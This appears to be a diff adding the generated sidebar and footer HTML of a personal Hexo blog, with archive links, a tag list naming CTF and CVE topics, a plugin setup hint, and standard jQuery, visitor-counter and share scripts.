+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2018/05/12/艰难的hexo上线/" >艰难的hexo上线</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2018/05/12/isccwp/" >isccwp</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="瞎记罢写"><span class="iconfont-archer">&#xe606;</span>瞎记罢写</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="CVE-2017-8464"><span class="iconfont-archer">&#xe606;</span>CVE-2017-8464</span>
+    
+        <span class="sidebar-tag-name" data-tags="BadUSB"><span class="iconfont-archer">&#xe606;</span>BadUSB</span>
+    
+        <span class="sidebar-tag-name" data-tags="netcat"><span class="iconfont-archer">&#xe606;</span>netcat</span>
+    
+        <span class="sidebar-tag-name" data-tags="系统"><span class="iconfont-archer">&#xe606;</span>系统</span>
+    
+        <span class="sidebar-tag-name" data-tags="CVE-2017-11882"><span class="iconfont-archer">&#xe606;</span>CVE-2017-11882</span>
+    
+        <span class="sidebar-tag-name" data-tags="git"><span class="iconfont-archer">&#xe606;</span>git</span>
+    
+        <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="kali docker"><span class="iconfont-archer">&#xe606;</span>kali docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="安全客弃婴"><span class="iconfont-archer">&#xe606;</span>安全客弃婴</span>
+    
+        <span class="sidebar-tag-name" data-tags="CVE-2018-8174"><span class="iconfont-archer">&#xe606;</span>CVE-2018-8174</span>
+    
+        <span class="sidebar-tag-name" data-tags="writeup ctf"><span class="iconfont-archer">&#xe606;</span>writeup ctf</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: '/',
+        author: 'threst'
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+    
+    </body>
+</html>
+
+
